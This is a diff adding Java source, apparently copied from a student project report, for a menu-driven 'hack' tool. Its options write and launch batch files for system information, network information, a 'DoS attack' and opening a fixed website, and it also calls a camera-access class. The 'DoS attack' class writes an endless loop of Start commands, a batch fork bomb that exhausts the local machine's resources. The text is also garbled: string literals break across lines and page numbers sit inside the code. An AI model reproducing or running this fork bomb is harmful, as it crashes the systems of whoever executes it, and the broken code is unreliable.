@@ -1,0 +1,108 @@
+SOURCE CODE
+MAIN ACTIVITY
+package hack.com;
+import java.util.*;
+import hack.com.*;
+public class MainActivity {
+public static void main(String[] args) throws Exception {
+Scanner in = new Scanner(System.in);
+System.out.println("ENTER THE OPTION YOU
+WANT: ");
+System.out.println("1.SYSTEM INFORMATION
+");
+System.out.println("2.NETWORK
+INFORMATION ");
+System.out.println("3.DOS ATTACK ");
+System.out.println("4.WEB REDIRECTING ");
+System.out.println("5.CAMERA ACCESS ");
+int option=in.nextInt();
+switch(option) {
+case 1:
+SystemInfo s= new SystemInfo();
+s.SystemInfo();
+break;
+case 2:
+NetworkInfo n=new NetworkInfo();
+n.NetworkInfo();
+break;
+case 3:
+DoSAttack d=new DoSAttack();
+d.DosAttack();
+break;
+case 4:
+WebReDirecting w=new WebReDirecting();
+w.WebReDirecting();
+break;
+
+13
+
+case 5:
+CameraAccess c=new CameraAccess();
+c.CameraAccess();
+break;
+}
+}
+}
+SYSTEM INFORMATION
+package hack.com;
+import java.io.*;
+public class SystemInfo {
+public static void SystemInfo()throws Exception {
+FileOutputStream fout=new FileOutputStream("D:\\sys.bat");
+String str="@echo off\nsysteminfo\npause";
+byte[] b=str.getBytes();
+fout.write(b);
+fout.close();
+String[] command = {"cmd.exe", "/C", "Start", "D:\\sys.bat"};
+Process p = Runtime.getRuntime().exec(command);
+}
+}
+NETWORK INFORMATION
+package hack.com;
+import java.io.*;
+public class NetworkInfo {
+public static void NetworkInfo() throws Exception {
+FileOutputStream fout=new FileOutputStream("D:\\net.bat");
+String str="@echo off\nipconfig\npause";
+byte[] b=str.getBytes();
+fout.write(b);
+fout.close();
+String[] command = {"cmd.exe", "/C", "Start", "D:\\net.bat"};
+Process p = Runtime.getRuntime().exec(command);
+}
+}
+
+14
+
+DOS ATTACK
+package hack.com;
+import java.io.*;
+public class DoSAttack {
+public static void DosAttack() throws Exception{
+FileOutputStream fout=new FileOutputStream("D:\\Dos.bat");
+String str="@echo off\n:top\nStart\ngoto top";
+byte[] b=str.getBytes();
+fout.write(b);
+fout.close();
+String[] command = {"cmd.exe", "/C", "Start", "D:\\Dos.bat"};
+Process p = Runtime.getRuntime().exec(command);
+}
+}
+WEB REDIRECTING
+package hack.com;
+import java.io.*;
+public class WebReDirecting {
+public static void WebReDirecting() throws Exception {
+FileOutputStream fout=new FileOutputStream("D:\\web.bat");
+String str="@echo off\nset
+
+url=\"https://dhesitheking.github.io/myweb.com/\"\nstart microsoft-
+edge:%url%";
+
+byte[] b=str.getBytes();
+fout.write(b);
+fout.close();
+String[] command = {"cmd.exe", "/C", "Start", "D:\\web.bat"};
+Process p = Runtime.getRuntime().exec(command);
+}
+}
